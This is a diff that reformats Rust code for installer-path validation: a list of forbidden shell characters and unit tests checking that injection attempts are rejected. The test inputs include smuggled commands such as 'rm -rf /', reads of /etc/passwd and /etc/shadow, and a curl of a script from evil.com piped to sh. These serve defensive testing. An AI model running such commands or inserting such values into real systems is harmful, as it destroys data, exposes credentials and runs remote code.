@@ -12,8 +12,8 @@ use tracing::{debug, error, info, warn};
 
 /// Characters that are forbidden in installer paths to prevent shell injection.
 const UNSAFE_PATH_CHARS: [char; 23] = [
-    ';', '|', '&', '$', '`', '\'', '"', '\\', '\n', '\r', '(', ')', '{', '}', '<', '>',
-    '*', '?', '[', ']', '!', '#', '~',
+    ';', '|', '&', '$', '`', '\'', '"', '\\', '\n', '\r', '(', ')', '{', '}', '<', '>', '*', '?',
+    '[', ']', '!', '#', '~',
 ];
 
 /// Validate that an installer path does not contain shell metacharacters.
@@ -346,22 +346,22 @@ mod tests {
     fn test_installer_path_rejects_shell_metacharacters() {
         // Each of these characters must be rejected individually
         let dangerous_paths = [
-            "/tmp/pkg;rm -rf /",           // semicolon
-            "/tmp/pkg|cat /etc/passwd",    // pipe
-            "/tmp/pkg&background",          // ampersand
-            "/tmp/pkg$(whoami)",            // dollar sign
-            "/tmp/pkg`id`",                // backtick
-            "/tmp/pkg'injected'",          // single quote
-            "/tmp/pkg\"injected\"",        // double quote (escaped for Rust)
-            "/tmp/pkg\\escaped",           // backslash
-            "/tmp/pkg\nwhoami",            // newline
-            "/tmp/pkg\rwhoami",            // carriage return
-            "/tmp/pkg(sub)",               // open paren
-            "/tmp/pkg)end",                // close paren
-            "/tmp/pkg{block}",             // open brace
-            "/tmp/pkg}end",                // close brace
-            "/tmp/pkg<input",              // less than
-            "/tmp/pkg>output",             // greater than
+            "/tmp/pkg;rm -rf /",        // semicolon
+            "/tmp/pkg|cat /etc/passwd", // pipe
+            "/tmp/pkg&background",      // ampersand
+            "/tmp/pkg$(whoami)",        // dollar sign
+            "/tmp/pkg`id`",             // backtick
+            "/tmp/pkg'injected'",       // single quote
+            "/tmp/pkg\"injected\"",     // double quote (escaped for Rust)
+            "/tmp/pkg\\escaped",        // backslash
+            "/tmp/pkg\nwhoami",         // newline
+            "/tmp/pkg\rwhoami",         // carriage return
+            "/tmp/pkg(sub)",            // open paren
+            "/tmp/pkg)end",             // close paren
+            "/tmp/pkg{block}",          // open brace
+            "/tmp/pkg}end",             // close brace
+            "/tmp/pkg<input",           // less than
+            "/tmp/pkg>output",          // greater than
         ];
 
         for path in &dangerous_paths {
@@ -415,11 +415,17 @@ mod tests {
     fn test_installer_path_rejects_combined_injection() {
         // A realistic injection attempt combining multiple techniques
         let result = validate_installer_path("/tmp/pkg; curl http://evil.com/shell.sh | sh");
-        assert!(result.is_err(), "Combined injection attempt must be rejected");
+        assert!(
+            result.is_err(),
+            "Combined injection attempt must be rejected"
+        );
 
         // Environment variable expansion attempt
         let result = validate_installer_path("/tmp/$HOME/.config/pkg");
-        assert!(result.is_err(), "Environment variable expansion must be rejected");
+        assert!(
+            result.is_err(),
+            "Environment variable expansion must be rejected"
+        );
 
         // Command substitution attempt
         let result = validate_installer_path("/tmp/$(cat /etc/shadow)");
